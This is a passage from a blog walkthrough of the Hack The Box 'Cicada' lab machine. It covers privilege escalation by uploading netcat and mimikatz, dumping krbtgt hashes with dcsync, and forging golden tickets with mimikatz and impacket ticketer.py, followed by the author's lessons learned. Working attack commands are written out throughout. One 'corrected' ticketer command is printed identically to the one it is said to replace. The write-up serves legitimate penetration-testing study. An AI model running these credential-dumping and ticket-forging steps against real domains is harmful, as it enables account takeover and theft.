+<p><strong>I upload</strong> <code>nc64.exe</code> <strong>and</strong> <code>mimikatz.exe</code> <strong>via</strong> <code>evil-winrm</code> <strong>session</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-184255_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-10-31-184307_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Start a reverse shell back to my attack machine</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-184335_.png">
+</figure>
+</li>
+<li>Evil-winrm does not play nice with mimikatz so we need standard reverse-shell.</li>
+</ul>
+</li>
+<li>
+<p><strong>Extract SID &amp; KRBTGT hashes</strong>:</p>
+<ul>
+<li><code>lsadump::dcsync /user:krbtgt /domain:cicada.htb</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-184359_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Create ticket</strong>:</p>
+<ul>
+<li><code>kerberos::golden /domain:cicada.local /user:Administrator /sid:S-1-5-21-917908876-1423158569-3159038727 /rc4:[rc4hash]</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-184230_.png">
+</figure>
+</li>
+<li>This has a typo (I can see now there is a trailing dash after the <code>SID</code> however it still won&rsquo;t work. Read on)</li>
+</ul>
+</li>
+<li>
+<p><strong>Download the</strong> <code>.kirbi</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-10-31-184515_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Convert</strong> <code>.kirbi</code> <strong>to</strong> <code>.ccache</code>:</p>
+<ul>
+<li><code>impacket-ticketConverter ticket.kirbi admin.ccache</code></li>
+<li><figure><img src="/ox-hugo/2024-10-31-192135_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Setup</strong> <code>KRB5CCNAME</code> <strong>var</strong>:</p>
+<ul>
+<li><code>export KRB5CCNAME=./admin.ccache</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Try and connect</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-01-113642_.png">
+</figure>
+</li>
+<li>It fails this is because I used the rc4 hash instead of the <code>AES</code> hash. So let&rsquo;s generate a new ticket using the <code>aesKey</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>I create a new ticket using</strong> <code>ticketer.py</code>:</p>
+<ul>
+<li><code>python ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator</code></li>
+<li><figure><img src="/ox-hugo/2024-11-01-113804_.png">
+</figure>
+</li>
+<li>+Imporant Note+: You do not need the <code>extra-pac</code> parameter the following will work, I was just airing on the side of caution as I had read this issue: <a href="https://github.com/fortra/impacket/issues/1457">https://github.com/fortra/impacket/issues/1457</a> however the pull request was merged so should be resolved. This command will work (have also tested)
+<ul>
+<li><code>python ticketer.py -aesKey [aesKey] -domain-sid [SID] -domain $domain -extra-pac -user-id 500 administrator</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Connect with</strong> <code>psexec</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-11-01-113904_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="golden-ticket-curiosities">Golden Ticket Curiosities:</h3>
+<ul>
+<li>
+<p>When generating a ticket using ticketer.py I can create the ticket and it works fine.</p>
+<ul>
+<li><code>python3 ../ticketer.py -aesKey [Key] -domain-sid [SID] -domain $domain administrator</code></li>
+</ul>
+</li>
+<li>
+<p>However when using mimikatz to generate the ticket, I use the exact same key SID etc:</p>
+<ul>
+<li><code>kerberos::golden /domain:[domain] /user:administrator /sid:[SID] /aes256:[Key]</code></li>
+</ul>
+</li>
+</ul>
+<p>I always get the error <code>[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)</code> when trying to use the mimikatz generated one. I have done various testing and unsure as to why.</p>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>This was mainly about enumeration. Enumerating well and thoroughly.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Frustratingly trying to determine the mimikatz ticket issue, it&rsquo;s annoying me. So it&rsquo;s not a mistake. Just grinding my gears until I figure it out.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        2610
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Nov 01 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
